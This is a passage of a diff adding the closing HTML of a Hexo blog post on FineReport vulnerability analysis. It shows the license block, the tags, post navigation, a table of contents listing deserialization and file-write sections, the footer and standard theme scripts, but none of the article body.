+                </div>
+                <div class="content">2026-03-20 20:34</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/15/%E5%B8%86%E8%BD%AFFineReport%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"
+                                   title="帆软FineReport历史漏洞分析（一）"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">帆软FineReport历史漏洞分析（一）</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">弱口令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.3.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#remote-design-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">&#x2F;remote&#x2F;design&#x2F;channel反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">3.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="nav-number">3.2.1.</span> <span class="nav-text">反序列化点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="nav-number">3.2.2.</span> <span class="nav-text">反序列化链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E5%AF%B9%E6%AF%94"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">黑名单对比</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hibernate%E9%93%BE"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">hibernate链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TreeBag%E9%93%BE"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">TreeBag链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TextAndMnemonicHashMap%E9%93%BE"><span class="nav-number">3.2.2.4.</span> <span class="nav-text">TextAndMnemonicHashMap链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ImmutableSetMultimap%E9%93%BE"><span class="nav-number">3.2.2.5.</span> <span class="nav-text">ImmutableSetMultimap链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#V11-%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">3.2.3.</span> <span class="nav-text">V11 鉴权分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">3.3.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FineVis%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">FineVis插件任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">4.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">4.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#V8-V9%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">V8 V9老版本漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">6.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">167.7k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">弱口令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.3.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#remote-design-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">&#x2F;remote&#x2F;design&#x2F;channel反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">3.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="nav-number">3.2.1.</span> <span class="nav-text">反序列化点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="nav-number">3.2.2.</span> <span class="nav-text">反序列化链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E5%AF%B9%E6%AF%94"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">黑名单对比</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hibernate%E9%93%BE"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">hibernate链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TreeBag%E9%93%BE"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">TreeBag链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TextAndMnemonicHashMap%E9%93%BE"><span class="nav-number">3.2.2.4.</span> <span class="nav-text">TextAndMnemonicHashMap链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ImmutableSetMultimap%E9%93%BE"><span class="nav-number">3.2.2.5.</span> <span class="nav-text">ImmutableSetMultimap链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#V11-%E9%89%B4%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">3.2.3.</span> <span class="nav-text">V11 鉴权分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">3.3.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FineVis%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">FineVis插件任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">4.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">4.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#V8-V9%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">V8 V9老版本漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">6.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
